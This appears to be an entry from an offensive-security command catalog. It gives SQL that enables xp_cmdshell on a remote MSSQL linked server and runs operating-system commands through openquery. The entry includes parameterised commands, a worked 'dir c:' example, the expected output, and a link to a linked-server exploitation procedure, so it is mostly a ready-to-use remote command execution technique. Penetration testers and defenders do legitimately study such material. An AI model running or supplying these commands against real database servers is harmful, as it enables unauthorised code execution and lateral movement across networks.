---
id: 9b2112a2-b697-41b5-b07c-7c5eff5aceab
name: enable-and-execute-xp-cmdshell-via-linked-server
type: command
executor: sql
data: >-
  EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT $_LINKED_SERVER

  select 1 from openquery("$_LINKED_SERVER",'select 1;exec master..xp_cmdshell
  "$_CMD"')
output: null
created_at: '2023-04-06T03:56:34.105366+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - execution
  - rce
verified: true
validated: true
---

# enable-and-execute-xp-cmdshell-via-linked-server

## Command

```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT $_LINKED_SERVER
select 1 from openquery("$_LINKED_SERVER",'select 1;exec master..xp_cmdshell "$_CMD"')
```

## Description

Enables the xp_cmdshell extended stored procedure on a remote linked server and executes an OS command via it, achieving remote command execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LINKED_SERVER | Name of the linked server | Yes |
| $_CMD | OS command to execute (e.g., dir c:) | Yes |

## Examples

### Enable and Dir

```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
```

## Expected Output

First command: Configuration option changed. Second: Results of the command, e.g., directory contents piped through the query.

1
Volume in drive C has no label.
Volume Serial Number is...

If xp_cmdshell disabled, first command fails.

## Related

- [[procedures/Exploit-MSSQL-Trusted-Linked-Servers]]
- [[commands/execute-query-through-linked-server]]
